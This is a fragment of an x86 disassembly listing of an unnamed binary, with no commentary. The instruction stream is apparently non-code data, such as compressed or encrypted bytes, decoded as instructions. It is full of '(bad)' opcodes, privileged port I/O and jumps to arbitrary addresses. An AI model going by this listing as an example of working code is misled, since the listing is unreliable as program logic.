  437269:	mov    DWORD PTR [ebp+0x7],ecx
  43726c:	leave  
  43726d:	sub    al,0xfc
  43726f:	cli    
  437270:	cmp    DWORD PTR [ecx+0x68],edi
  437273:	jp     0x43723b
  437275:	adc    DWORD PTR [ecx],edi
  437277:	cmovno edi,DWORD PTR [edx]
  43727a:	push   0xae5702b2
  43727f:	(bad)  
  437280:	jns    0x437229
  437282:	repnz adc bh,al
  437285:	jle    0x43728b
  437287:	cmp    ch,bl
  437289:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43728b:	mov    eax,0xb004ac06
  437290:	pusha  
  437291:	push   edx
  437292:	test   BYTE PTR [ecx+0x40d5c0ea],cl
  437298:	inc    esi
  437299:	mov    eax,ds:0xbe3b7864
  43729e:	or     al,0x72
  4372a0:	push   0x96a0f038
  4372a5:	imul   ecx,ebp,0xffffffc6
  4372a8:	or     al,0x7b
  4372aa:	pop    ds
  4372ab:	cmp    ebx,DWORD PTR [edi+0x4263f78]
  4372b1:	ror    DWORD PTR [edi-0x2a79056b],1
  4372b7:	fwait
  4372b8:	sbb    ebp,ebx
  4372ba:	ins    DWORD PTR es:[edi],dx
  4372bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4372bc:	pop    ds
  4372bd:	(bad)  
  4372be:	out    dx,al
  4372bf:	(bad)  
  4372c0:	std    
  4372c1:	lock test DWORD PTR [edi-0x4a40c001],ebp
  4372c8:	mov    ah,0xb4
  4372ca:	js     0x43730b
  4372cc:	icebp  
  4372cd:	add    edi,ebp
  4372cf:	es jo  0x4372a8
  4372d2:	adc    eax,0x784ebf19
  4372d7:	xchg   DWORD PTR [edi+ebx*8],esi
  4372da:	mov    DWORD PTR [edi+0x1ee41c4d],esi
  4372e0:	shl    BYTE PTR [eax],0x6b
  4372e3:	mov    dl,0x1
  4372e5:	ins    DWORD PTR es:[edi],dx
  4372e6:	mov    al,BYTE PTR [ecx]
  4372e8:	pusha  
  4372e9:	rcl    BYTE PTR [eax-0x73],0x1b
  4372ed:	in     eax,0xa4
  4372ef:	or     edx,edx
  4372f1:	pop    ebx
  4372f2:	fwait
  4372f3:	gs out dx,eax
  4372f5:	cld    
  4372f6:	inc    eax
  4372f7:	jl     0x43736f
  4372f9:	inc    edi
  4372fa:	out    0x1c,al
  4372fc:	jl     0x43733a
  4372fe:	ficomp DWORD PTR [edx+0x5b748126]
  437304:	adc    dh,BYTE PTR [eax+ebp*4+0x3e]
  437308:	aam    0x1b
  43730a:	fist   WORD PTR [ebx]
  43730c:	fwait
  43730d:	add    eax,0x64169629
  437312:	mov    dl,BYTE PTR [ebx-0x3c28d141]
  437318:	retf   
  437319:	and    DWORD PTR [ecx],0x767c64b7
  43731f:	push   ebx
  437320:	sub    al,0xfc
  437322:	mov    ds:0x7ada1532,eax
  437327:	hlt    
  437328:	popa   
  437329:	cmp    dl,bl
  43732b:	cld    
  43732c:	jne    0x437367
  43732e:	sbb    eax,0x7930f818
  437333:	loope  0x43730d
  437335:	pop    esi
  437336:	xor    esi,DWORD PTR [edx+0x65]
  437339:	pop    edi
  43733a:	call   0x80cd3cf6
  43733f:	scas   al,BYTE PTR es:[edi]
  437340:	mov    ecx,0xa8113636
  437345:	inc    esp
  437346:	aam    0x6d
  437348:	stos   BYTE PTR es:[edi],al
  437349:	xor    al,0x4b
  43734b:	scas   al,BYTE PTR es:[edi]
  43734c:	imul   edx,DWORD PTR [eax-0x5],0xcb9176b6
  437353:	icebp  
  437354:	push   0x6367db8c
  437359:	fdiv   QWORD PTR [eax-0x7f8b1f05]
  43735f:	add    DWORD PTR [edi-0x73a91e10],eax
  437365:	pop    edi
  437366:	pop    edx
  437367:	sub    BYTE PTR [edi],dl
  437369:	fs cmp al,0x3b
  43736c:	test   DWORD PTR [ebx+ebx*4],edi
  43736f:	(bad)  {k7}
  437374:	push   cs
  437375:	enter  0xd84b,0xc4
  437379:	hlt    
  43737a:	cmp    eax,0x4392db5
  43737f:	lahf   
  437380:	mov    BYTE PTR [esi-0x1310e8c2],bh
  437386:	xchg   edi,eax
  437387:	mov    bl,0xe0
  437389:	pusha  
  43738a:	push   esp
  43738b:	ret    0x8da3
  43738e:	push   ss
  43738f:	sar    BYTE PTR [edx],0x40
  437392:	inc    ebp
  437393:	and    eax,0xf27082cf
  437398:	js     0x437326
  43739a:	aad    0x55
  43739c:	cmp    ebx,ebp
  43739e:	adc    eax,eax
  4373a0:	sbb    bl,cl
  4373a2:	mov    al,ds:0xe4f62044
  4373a7:	adc    BYTE PTR [esi-0x41],ch
  4373aa:	in     al,dx
  4373ab:	jl     0x437378
  4373ad:	mov    eax,ds:0x93fc69e7
  4373b2:	xor    BYTE PTR [ebx-0x4996d670],ah
  4373b8:	sbb    al,0x4e
  4373ba:	jns    0x43736d
  4373bc:	pop    esp
  4373bd:	dec    esp
  4373be:	mov    esi,0xdd34289c
  4373c3:	xchg   edi,eax
  4373c4:	mov    ds:0x93b22313,al
  4373c9:	xchg   ebx,eax
  4373ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4373cb:	xor    al,cl
  4373cd:	cmp    ah,BYTE PTR [ecx]
  4373cf:	(bad)  
  4373d0:	loope  0x437412
  4373d2:	and    eax,0x1c5386d7
  4373d7:	pop    edi
  4373d8:	add    cl,cl
  4373da:	outs   dx,BYTE PTR ds:[esi]
  4373db:	and    BYTE PTR [ebx],ch
  4373dd:	dec    ecx
  4373de:	dec    esi
  4373df:	and    BYTE PTR [esi+0x4c6bf48d],0x66
  4373e6:	(bad)  
  4373e7:	adc    BYTE PTR [edx+0x1],bl
  4373ea:	jle    0x4373ee
  4373ec:	cld    
  4373ed:	outs   dx,BYTE PTR ds:[esi]
  4373ee:	add    al,dl
  4373f0:	inc    esi
  4373f1:	mov    bh,BYTE PTR gs:[edx]
  4373f4:	jl     0x43746b
  4373f6:	push   0x9d9dab93
  4373fb:	mov    edi,0xfe7e7371
  437400:	inc    edi
  437401:	dec    edx
  437402:	lahf   
  437403:	(bad)  
  437404:	hlt    
  437405:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437406:	stos   DWORD PTR es:[edi],eax
  437407:	fdivp  st(0),st
  437409:	loop   0x437462
  43740b:	addr16 pop esi
  43740d:	jg     0x4373f8
  43740f:	imul   ebp,ebp,0xffffffd8
  437412:	pop    esp
  437413:	xchg   edx,eax
  437414:	push   ebp
  437415:	jge    0x4373a1
  437417:	push   esi
  437418:	outs   dx,BYTE PTR ds:[esi]
  437419:	or     eax,DWORD PTR gs:[ebx+0x12ce29f8]
  437420:	mov    esp,0xdca06cd5
  437425:	mov    bl,0xdc
  437427:	push   ss
  437428:	or     ecx,DWORD PTR [ecx-0x3543d494]
  43742e:	xchg   esp,eax
  43742f:	mov    ebx,0x3697ac26
  437434:	jmp    0xae25:0x703dcc90
  43743b:	jg     0x43745f
  43743d:	scas   al,BYTE PTR es:[edi]
  43743e:	and    esi,ebp
  437440:	dec    edi
  437441:	cmp    ch,BYTE PTR ds:0xf8325ed0
  437447:	lock call 0xce48feab
  43744d:	and    BYTE PTR [ebx-0x2],dl
  437450:	cdq    
  437451:	test   al,0x2
  437453:	fimul  DWORD PTR [ebx]
  437455:	jbe    0x43747c
  437457:	inc    edx
  437458:	or     dh,BYTE PTR [edx]
  43745a:	adc    ch,al
  43745c:	mov    dl,0x15
  43745e:	not    DWORD PTR [eax-0x1d]
  437461:	push   cs
  437462:	out    0x20,eax
  437464:	push   edx
  437465:	pop    eax
  437466:	mov    dl,0xea
  437468:	(bad)  
  437469:	pop    ebp
  43746a:	cwde   
  43746b:	out    0x86,eax
  43746d:	sub    eax,esi
  43746f:	jmp    0x8eda:0x97919cb2
  437476:	sbb    eax,0x1e9c38a
  43747b:	sbb    eax,0xc4262b64
  437480:	or     BYTE PTR [esi-0x60],ah
  437483:	sub    bl,BYTE PTR [ebx]
  437485:	pop    edi
  437486:	rcl    BYTE PTR [ecx+0x7b],0xb2
  43748a:	jo     0x4374ae
  43748c:	xor    DWORD PTR [eax+0x3f],0xfffffffa
  437490:	jge    0x4374b3
  437492:	(bad)  
  437493:	in     al,dx
  437494:	(bad)  
  437495:	adc    ebp,DWORD PTR fs:[ebp-0x65c3d1b9]
  43749c:	sahf   
  43749d:	add    esp,DWORD PTR [ebp-0x8]
  4374a0:	pop    ebx
  4374a1:	mov    dl,0x99
  4374a3:	inc    edi
  4374a4:	mov    dh,0x63
  4374a6:	mov    ebp,0xd4e1c91c
  4374ab:	sar    BYTE PTR [ecx],0x88
  4374ae:	jns    0x437448
  4374b0:	ss jecxz 0x43745e
  4374b3:	sar    DWORD PTR [esi],1
  4374b5:	sbb    al,0x4f
  4374b7:	addr16 mov ds:0xd8af,al
  4374bb:	lock cmp DWORD PTR [ecx+0x5],ebx
  4374bf:	xchg   ecx,eax
  4374c0:	popf   
  4374c1:	and    DWORD PTR [ecx-0x636ca20a],edi
  4374c7:	adc    DWORD PTR [edi+0x53],esi
  4374ca:	(bad)  
  4374cb:	push   ss
  4374cc:	add    edi,edi
  4374ce:	and    BYTE PTR [eax],cl
  4374d0:	rcr    BYTE PTR [edx+0x48],cl
  4374d3:	fimul  DWORD PTR [ebx+0x12]
  4374d6:	add    ah,BYTE PTR [edi+0x7a6a7465]
  4374dc:	out    0x21,al
  4374de:	fldcw  WORD PTR [edi-0x5dc726c0]
  4374e4:	cmp    bh,bl
  4374e6:	jb     0x4374f9
  4374e8:	adc    eax,0xad4c79ec
  4374ed:	je     0x43750c
  4374ef:	mov    al,0x6f
  4374f1:	jmp    0xcf16:0x3be6125e
  4374f8:	ds push ds
  4374fa:	out    dx,eax
  4374fb:	test   cl,bh
  4374fd:	sbb    DWORD PTR [esp+eax*2-0x73ddd9f2],ecx
  437504:	or     eax,0xf64879ac
  437509:	mov    bh,0x9c
  43750b:	nop
  43750c:	repz pop ebx
  43750e:	dec    eax
  43750f:	jne    0x437557
  437511:	jnp    0x4374ef
  437513:	(bad)  
  437514:	mov    cl,0xef
  437516:	xchg   edi,eax
  437517:	mov    ch,0x0
  437519:	test   BYTE PTR ds:0x3b7e70e,0xbc
  437520:	adc    BYTE PTR [eax+ebx*4+0x4b],al
  437524:	clc    
  437525:	xchg   edi,eax
  437526:	sbb    BYTE PTR [ebx-0x37],ah
  437529:	push   cs
  43752a:	imul   esi,DWORD PTR [eax+0xc],0xb6b17f24
  437531:	dec    eax
  437532:	dec    edi
  437533:	pop    edi
  437534:	lods   al,BYTE PTR ds:[esi]
  437535:	lods   al,BYTE PTR ds:[esi]
  437536:	fdivr  QWORD PTR [edi-0x65644448]
  43753c:	cmp    ebx,DWORD PTR [esi+0x3e]
  43753f:	pop    eax
  437540:	ds (bad) 
  437542:	loope  0x437503
  437544:	not    BYTE PTR [ebx+0x7f]
  437547:	hlt    
  437548:	xchg   ebp,eax
  437549:	iret   
  43754a:	std    
  43754b:	jecxz  0x43752e
  43754d:	popf   
  43754e:	lods   eax,DWORD PTR ds:[esi]
  43754f:	sti    
  437550:	pushf  
  437551:	in     eax,0x78
  437553:	repnz icebp 
  437555:	adc    BYTE PTR [edi-0x38],dl
  437558:	daa    
  437559:	pop    es
  43755a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43755b:	in     al,0x59
  43755d:	mov    ecx,0x2c70da8e
  437562:	xor    dl,BYTE PTR [eax+esi*1-0x2c]
  437566:	stos   BYTE PTR es:[edi],al
  437567:	mov    esp,0x295e5344
  43756c:	mov    al,bh
  43756e:	imul   esi,DWORD PTR [ebx-0x5f374db4],0x1d3a1e12
  437578:	xlat   BYTE PTR ds:[ebx]
  437579:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43757a:	lds    eax,FWORD PTR [esi]
  43757c:	sbb    ecx,DWORD PTR [esi]
  43757e:	mov    ss,WORD PTR [ebp+0xfa63959]
  437584:	cmp    BYTE PTR [edi+0x39],ah
  437587:	push   ss
  437588:	out    0x11,eax
  43758a:	sbb    eax,0x89428684
  43758f:	inc    ebp
  437590:	fisub  DWORD PTR [esi]
  437592:	xor    DWORD PTR [ebp-0x1e],esp
  437595:	lock add BYTE PTR [edi],ch
  437598:	sahf   
  437599:	xchg   ebx,eax
  43759a:	loope  0x437539
  43759c:	push   eax
  43759d:	push   0xffffffdf
  43759f:	mov    cl,cl
  4375a1:	push   0xffffff92
  4375a3:	test   DWORD PTR ds:0xc8221aa,ecx
  4375a9:	lock test edx,esp
  4375ac:	cli    
  4375ad:	mov    ebx,0x99a07cf1
  4375b2:	imul   ebx,esp,0xd3138788
  4375b8:	fisttp QWORD PTR [ebx-0x12560fb]
  4375be:	and    eax,0x2c3a94d9
  4375c3:	mov    ds:0xe48472b9,eax
  4375c8:	xor    DWORD PTR [ecx],edi
  4375ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4375cb:	(bad)
  4375ce:	pop    esi
  4375cf:	ds pop ebp
  4375d1:	xlat   BYTE PTR ds:[ebx]
  4375d2:	arpl   WORD PTR [ebx],dx
  4375d4:	mov    esi,0xde9b1329
  4375d9:	mov    ?,WORD PTR [esi]
  4375db:	cmp    DWORD PTR ds:0x50ef8c50,0x6d86cf5c
  4375e5:	pop    DWORD PTR [ebp+0x43]
  4375e8:	sbb    BYTE PTR [ebp+0x72cbce4c],cl
  4375ee:	push   ss
  4375ef:	sbb    ecx,DWORD PTR [esi+0x14b946de]
  4375f5:	fidiv  DWORD PTR [eax-0x70f6c7b4]
  4375fb:	bound  ebx,QWORD PTR [edi+0x2c]
  4375fe:	ficom  DWORD PTR [edx-0x4]
  437601:	pop    ds
  437602:	mov    esi,0x5034f240
  437607:	frstor [edi]
  437609:	in     eax,0x3c
  43760b:	adc    edx,DWORD PTR [eax-0x5f]
  43760e:	pushf  
  43760f:	out    0x9d,al
  437611:	xor    dl,dh
  437613:	add    BYTE PTR [eax-0x7fffc58f],ch
  437619:	jge    0x43761e
  43761b:	pop    esi
  43761c:	jp     0x437640
  43761e:	push   ss
  43761f:	cmp    edx,eax
  437621:	push   es
  437622:	adc    bl,BYTE PTR [ebx+0x7c]
  437625:	adc    al,0x6c
  437627:	sbb    al,0x22
  437629:	add    eax,0x7326bf7c
  43762e:	inc    eax
  43762f:	adc    BYTE PTR [edi-0x15467591],bl
  437635:	nop
  437636:	xor    eax,0xe98c92d1
  43763b:	shl    BYTE PTR [edi+0x1],0x3c
  43763f:	sbb    BYTE PTR [esi],bh
  437641:	dec    ecx
  437642:	mov    al,bh
  437644:	add    bh,BYTE PTR [edi+0x3c465c95]
  43764a:	inc    edi
  43764b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43764c:	loop   0x437602
  43764e:	mov    ds:0x37e01362,eax
  437653:	mov    dl,ch
  437655:	jb     0x43761f
  437657:	inc    eax
  437658:	mov    ebx,0xa8804e0f
  43765d:	ret    
  43765e:	ins    BYTE PTR es:[edi],dx
  43765f:	(bad)  
  437660:	(bad)  
  437661:	dec    ecx
  437662:	cmp    DWORD PTR [edx+0x4],esi
  437665:	nop
  437666:	mov    esp,edx
  437668:	gs leave 
  43766a:	sbb    cl,BYTE PTR [eax]
  43766c:	adc    BYTE PTR [edi+0x4],bh
  43766f:	and    dl,BYTE PTR [ebp-0x7b]
  437672:	outs   dx,DWORD PTR ds:[esi]
  437673:	push   cs
  437674:	or     al,0x7c
  437676:	loope  0x43764a
  437678:	clc    
  437679:	clc    
  43767a:	test   DWORD PTR [ecx-0x2a],0xe0d0f52c
  437681:	mov    DWORD PTR [ecx-0x79a8245b],esi
  437687:	test   eax,0x474fcb6a
  43768c:	or     al,0x28
  43768e:	icebp  
  43768f:	shr    DWORD PTR [ecx],cl
  437691:	(bad)  
  437693:	iret   
  437694:	mov    cl,0xff
  437696:	mov    ecx,0x9da8dea
  43769b:	xchg   BYTE PTR [edx-0x7b7f24c3],bh
  4376a1:	gs push eax
  4376a3:	repz jp 0x43770a
  4376a6:	add    al,0x20
  4376a8:	mov    eax,0xa49cf4e6
  4376ad:	retf   0x8f5e
  4376b0:	mov    ebx,eax
  4376b2:	loope  0x4376fa
  4376b4:	jb     0x4376bc
  4376b6:	adc    eax,0xc4689151
  4376bb:	pop    ecx
  4376bc:	push   edi
  4376bd:	arpl   WORD PTR [eax-0xf],si
  4376c0:	int3   
  4376c1:	jecxz  0x4376b3
  4376c3:	xchg   ebx,eax
  4376c4:	mov    WORD PTR [ebx+0x473fcf86],fs
  4376ca:	jl     0x4376fd
  4376cc:	test   al,0xb3
  4376ce:	mov    cl,0xa8
  4376d0:	mov    al,ds:0x6cd830f
  4376d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4376d6:	push   ebx
  4376d7:	xchg   ebx,eax
  4376d8:	int3   
  4376d9:	mov    ebx,0x244547
  4376de:	sub    esi,ebx
  4376e0:	icebp  
  4376e1:	jg     0x43769f
  4376e3:	loope  0x437739
  4376e5:	(bad)  
  4376e6:	jmp    0xd400ea82
  4376eb:	imul   DWORD PTR [edi+0x45]
  4376ee:	(bad)  
  4376f0:	(bad)  
  4376f2:	sub    DWORD PTR [edi+0x4eef88e8],0x8b2527ca
  4376fc:	push   0x4a
  4376fe:	push   es
  4376ff:	loopne 0x4376e5
  437701:	test   BYTE PTR ds:0x64f9e1c9,ch
  437707:	cmp    al,0xff
  437709:	inc    ebp
  43770a:	cmp    DWORD PTR [ebx],eax
  43770c:	scas   al,BYTE PTR es:[edi]
  43770d:	dec    ebp
  43770e:	push   cs
  43770f:	dec    ebx
  437710:	xchg   edx,eax
  437711:	and    bl,BYTE PTR [ebp+0x2c4cf0c6]
  437717:	sub    al,0x4
  437719:	int3   
  43771a:	jno    0x4376d5
  43771c:	mov    BYTE PTR [ebx-0x16],cl
  43771f:	out    dx,eax
  437720:	gs cdq 
  437722:	out    0x1d,al
  437724:	push   edx
  437725:	dec    edx
  437726:	cmp    al,0xe3
  437728:	cmp    BYTE PTR [edx-0x37],ch
  43772b:	push   esi
  43772c:	jl     0x437786
  43772e:	test   DWORD PTR es:0x39b1a190,ebx
  437735:	daa    
  437736:	add    edi,DWORD PTR [esi]
  437738:	(bad)  
  437739:	in     al,0x67
  43773b:	jns    0x437797
  43773d:	pop    es
  43773e:	shr    DWORD PTR [esi-0x15],1
  437741:	xor    edi,esi
  437743:	aaa    
  437744:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  437746:	sbb    BYTE PTR [ebx-0x55ce45ec],cl
  43774c:	inc    ebp
  43774d:	cmc    
  43774e:	inc    ebp
  43774f:	pop    edi
  437750:	dec    edi
  437751:	enter  0xf579,0xa0
  437755:	and    eax,0x239acbaf
  43775a:	adc    DWORD PTR [ecx-0x345019cc],ebp
  437760:	or     DWORD PTR [eax+0xd],edx
  437763:	xor    ah,ah
  437765:	mov    eax,0x559b2e46
  43776a:	pop    ss
  43776b:	ins    DWORD PTR es:[edi],dx
  43776c:	dec    edi
  43776d:	pop    edx
  43776e:	adc    eax,DWORD PTR ds:0x4efb5249
  437774:	(bad)  
  437775:	std    
  437776:	shl    BYTE PTR [ebp-0x3121f4fd],1
  43777c:	ss pop ss
  43777e:	in     eax,dx
  43777f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  437780:	outs   dx,BYTE PTR ds:[esi]
  437781:	popa   
  437782:	inc    ebp
  437783:	imul   BYTE PTR [ecx+ebp*8+0x20]
  437787:	call   0xfe465697
  43778c:	adc    DWORD PTR [edx],ebp
  43778e:	inc    ebx
  43778f:	mov    ds:0xc5cf0291,eax
  437794:	ja     0x437717
  437796:	cmp    DWORD PTR [edx],eax
  437798:	push   edi
  437799:	add    bh,BYTE PTR [esi-0x4671e3d4]
  43779f:	pusha  
  4377a0:	xchg   ebx,eax
  4377a1:	in     al,dx
  4377a2:	sub    esp,DWORD PTR [ecx]
  4377a4:	fadd   QWORD PTR [edi-0x6e]
  4377a7:	push   ds
  4377a8:	add    eax,0x9541f05a
  4377ad:	fistp  DWORD PTR [edx+0x53]
  4377b0:	mov    bl,0x3d
  4377b2:	mov    dh,0xb5
  4377b4:	aad    0x17
  4377b6:	shr    DWORD PTR [eax+0x1],cl
  4377b9:	lock jae 0x43783b
  4377bc:	sti    
  4377bd:	jg     0x437838
  4377bf:	loop   0x4377a0
  4377c1:	jge    0x4377b1
  4377c3:	mov    bl,0xcf
  4377c5:	das    
  4377c6:	dec    esi
  4377c7:	(bad)  [edx+0x3504d580]
  4377cd:	or     dh,BYTE PTR [eax-0x7a00ffa]
  4377d3:	add    BYTE PTR [ebx+ebp*4],ah
  4377d6:	sub    dl,BYTE PTR [eax+0x38]
  4377d9:	xchg   ebx,eax
  4377da:	fimul  WORD PTR [eax+0xe]
  4377dd:	ja     0x43785a
  4377df:	or     al,0x4
  4377e1:	push   edx
  4377e2:	ds jge 0x437863
  4377e5:	dec    esp
  4377e6:	push   cs
  4377e7:	sti    
  4377e8:	dec    eax
  4377e9:	into   
  4377ea:	ret    
  4377eb:	xchg   DWORD PTR [ecx+0x1498e1f5],ecx
  4377f1:	jb     0x4377f8
  4377f3:	lock cmp eax,0x3828cce4
  4377f9:	jg     0x798d2cc9
  4377ff:	inc    esp
  437800:	add    bh,BYTE PTR [edx+edi*1+0x3c]
  437804:	sti    
  437805:	pushf  
  437806:	shl    BYTE PTR [eax+0x2d0f104],0xd9
  43780d:	cmp    eax,0x2abc0319
  437812:	xchg   edi,eax
  437813:	mov    ds:0x8fd197ee,al
  437818:	adc    BYTE PTR [edx+0x22],bh
  43781b:	pop    ecx
  43781c:	cmp    esi,DWORD PTR [edx+0x21d1b067]
  437822:	pushf  
  437823:	test   BYTE PTR [edi-0x71],dh
  437826:	lahf   
  437827:	cmc    
  437828:	push   0xc97dbc03
  43782d:	mov    dh,0x4f
  43782f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  437830:	dec    edx
  437831:	cmp    bh,BYTE PTR [ecx]
  437833:	mov    es,WORD PTR [edi+edi*4-0x37]
  437837:	out    dx,eax
  437838:	jg     0x437896
  43783a:	scas   al,BYTE PTR es:[edi]
  43783b:	sub    BYTE PTR [esi+eiz*1+0x16330c9e],dl
  437842:	dec    ebx
  437843:	push   ds
  437844:	sub    eax,DWORD PTR [edi+0xb330e37]
  43784a:	sub    al,0x3c
  43784c:	push   0xedb52034
  437851:	xor    bh,BYTE PTR [edx+edi*2-0x2c08a9b8]
  437858:	mov    bl,0x46
  43785a:	in     eax,0x64
  43785c:	das    
  43785d:	inc    edx
  43785e:	dec    esp
  43785f:	dec    ecx
  437860:	xor    BYTE PTR [esi+eiz*1+0xc00e917],bh
  437867:	add    eax,0x9e32bbb4
  43786c:	not    DWORD PTR [esp+edi*8+0x7e]
  437870:	sub    al,0xc6
  437872:	sub    ebp,DWORD PTR [ecx+0x50]
  437875:	and    edx,ecx
  437877:	addr16 in al,dx
  437879:	test   DWORD PTR [ecx+0x39],0xecb2f5ad
  437880:	cmp    edi,DWORD PTR [edx+0x5fa06b1d]
  437886:	scas   al,BYTE PTR es:[edi]
  437887:	push   ebp
  437888:	(bad)  
  437889:	jo     0x4378b0
  43788b:	add    DWORD PTR ds:0x5c92d032,0xf35817e1
  437895:	mov    ds:0xde22f80c,al
  43789a:	(bad)  
  43789b:	stc    
  43789c:	inc    eax
  43789d:	jle    0x437861
  43789f:	sub    esi,DWORD PTR [edx+0x64260fe3]
  4378a5:	inc    edx
  4378a6:	mov    bh,0x39
  4378a8:	repnz adc BYTE PTR ds:0x8a330a0e,cl
  4378af:	ror    BYTE PTR [edx+0x4e],0xd6
  4378b3:	inc    ecx
  4378b4:	and    eax,DWORD PTR [esi]
  4378b6:	cmp    BYTE PTR [eax+edx*1-0x135f019d],0x9b
  4378be:	add    cl,BYTE PTR [edx+0x36794d]
  4378c4:	inc    edx
  4378c5:	js     0x4378b9
  4378c7:	loope  0x437885
  4378c9:	add    bh,al
  4378cb:	dec    edi
  4378cc:	sahf   
  4378cd:	retf   0xac94
  4378d0:	add    DWORD PTR [ebx-0x29b78d29],edx
  4378d6:	pushf  
  4378d7:	add    ecx,edx
  4378d9:	push   ecx
  4378da:	cli    
  4378db:	sbb    eax,0x2887116d
  4378e0:	dec    eax
  4378e1:	push   edx
  4378e2:	dec    esp
  4378e3:	and    BYTE PTR [ebx+esi*1+0x1c],bh
  4378e7:	retf   0x3138
  4378ea:	sar    DWORD PTR [ebx],cl
  4378ec:	inc    edi
  4378ed:	pop    ebx
  4378ee:	(bad)  
  4378f0:	fwait
  4378f1:	stc    
  4378f2:	in     eax,0x85
  4378f4:	pop    edi
  4378f5:	popa   
  4378f6:	ins    DWORD PTR es:[edi],dx
  4378f7:	ficom  WORD PTR [edi]
  4378f9:	add    cl,ch
  4378fb:	out    0x43,eax
  4378fd:	(bad)  
  4378fe:	mov    esi,0x5cae67ef
  437903:	jl     0x4378ee
  437905:	pop    ss
  437906:	pop    edx
  437907:	aaa    
  437908:	push   esi
  437909:	out    dx,eax
  43790a:	push   edi
  43790b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43790c:	and    ecx,esp
  43790e:	add    BYTE PTR [ecx],0x7
  437911:	xchg   edi,eax
  437912:	(bad)  
  437913:	xchg   esp,eax
  437914:	retf   0xecf9
  437917:	sub    BYTE PTR [ebp-0x73550d7e],0xc1
  43791e:	and    cl,bh
  437920:	cmp    eax,0x648ea732
  437926:	ror    BYTE PTR [ecx-0x7b6cef4c],cl
  43792c:	aas    
  43792d:	sbb    al,0x1b
  43792f:	add    eax,0x684e5466
  437934:	pop    eax
  437935:	sbb    BYTE PTR [ecx+0x6a44ec64],0x5
  43793c:	nop
  43793d:	mov    al,ds:0x16b59922
  437942:	xor    al,0x20
  437944:	pusha  
  437945:	lahf   
  437946:	icebp  
  437947:	mov    eax,0xda6e0d27
  43794c:	lock pop edi
  43794e:	mov    BYTE PTR ds:0x7426227b,al
  437954:	push   ebp
  437955:	es sti 
  437957:	sbb    dh,0x8c
  43795a:	clc    
  43795b:	out    dx,al
  43795c:	cwde   
  43795d:	ins    BYTE PTR es:[edi],dx
  43795e:	sub    ebx,DWORD PTR [edi-0x7b6f7a75]
  437964:	adc    al,0x69
  437966:	mov    edx,0x75493fc0
  43796b:	gs jno 0x437960
  43796e:	sbb    eax,0x7ec4414c
  437973:	mov    DWORD PTR [esi+0x24],ebp
  437976:	xor    ebp,edx
  437978:	aad    0x68
  43797a:	pop    es
  43797b:	sbb    al,0x76
  43797d:	(bad)  
  43797e:	enter  0x86c9,0xc4
  437982:	inc    BYTE PTR [ebx+0x6b348b32]
  437988:	sub    dh,BYTE PTR [esi]
  43798a:	bswap  edx
  43798c:	imul   ebx,DWORD PTR [edi+0x2c6a72d3],0xf9a00435
  437996:	and    bl,BYTE PTR [edi-0x4]
  437999:	sbb    ebx,ecx
  43799b:	pop    esp
  43799c:	xchg   edx,eax
  43799d:	das    
  43799e:	(bad)  
  43799f:	xlat   BYTE PTR ds:[ebx]
  4379a0:	cmp    cl,BYTE PTR [ebp-0x684dfc15]
  4379a6:	jns    0x4379cd
  4379a8:	jnp    0x4379e0
  4379aa:	call   0x205069e2
  4379af:	out    dx,al
  4379b0:	dec    eax
  4379b1:	ins    BYTE PTR es:[edi],dx
  4379b2:	dec    edx
  4379b3:	xlat   BYTE PTR ds:[ebx]
  4379b4:	mov    edi,0x4a746319
  4379b9:	dec    esi
  4379ba:	mov    ecx,0x6680cda6
  4379bf:	cmp    ah,BYTE PTR [edx-0x9ce9231]
  4379c5:	(bad)  [edx-0x5e]
  4379c8:	adc    BYTE PTR [ebx],bl
  4379ca:	adc    al,0xf6
  4379cc:	pusha  
  4379cd:	add    al,0x2f
  4379cf:	sbb    bl,BYTE PTR [esi-0x6d]
  4379d2:	in     al,dx
  4379d3:	stos   DWORD PTR es:[edi],eax
  4379d4:	(bad)  [ecx+0x1019c1fb]
  4379da:	pop    ds
  4379db:	dec    edi
  4379dc:	data16 fdivr DWORD PTR [ebx+0x63]
  4379e0:	outs   dx,BYTE PTR ds:[esi]
  4379e1:	es in  eax,0x30
  4379e4:	pop    esp
  4379e5:	mov    edx,0x901dd616
  4379ea:	mov    al,ds:0xae032f5
  4379ef:	dec    edx
  4379f0:	scas   eax,DWORD PTR es:[edi]
  4379f1:	hlt    
  4379f2:	in     al,dx
  4379f3:	and    al,0xa4
  4379f5:	scas   eax,DWORD PTR es:[edi]
  4379f6:	retf   
  4379f7:	shr    DWORD PTR [eax],1
  4379f9:	clc    
  4379fa:	daa    
  4379fb:	popa   
  4379fc:	mov    dl,0xca
  4379fe:	mov    edx,eax
  437a00:	and    dl,BYTE PTR [eax]
  437a02:	jo     0x4379a4
  437a04:	mov    bl,0x19
  437a06:	or     DWORD PTR ds:0x6f248a13,esi
  437a0c:	add    eax,0x315bcd5e
  437a11:	aas    
  437a12:	adc    al,bl
  437a14:	push   eax
  437a15:	(bad)  
  437a16:	mov    eax,edx
  437a18:	sub    ch,cl
  437a1a:	out    dx,eax
  437a1b:	sbb    al,0x99
  437a1d:	mov    ebx,0x5f17bd92
  437a22:	adc    BYTE PTR [ecx],dl
  437a24:	adc    esp,edi
  437a26:	or     eax,0xebca6a54
  437a2b:	pop    es
  437a2c:	and    al,0x21
  437a2e:	xchg   edi,eax
  437a2f:	push   cs
  437a30:	xchg   ecx,eax
  437a31:	popf   
  437a32:	(bad)  
  437a33:	(bad)  
  437a34:	aas    
  437a35:	sbb    BYTE PTR [edi+0x5b],bl
  437a38:	cli    
  437a39:	mov    BYTE PTR [edx+0x2002039f],dh
  437a3f:	std    
  437a40:	jl     0x437a2e
  437a42:	or     edi,0x7c
  437a45:	jbe    0x437a31
  437a47:	fwait
  437a48:	jmp    ecx
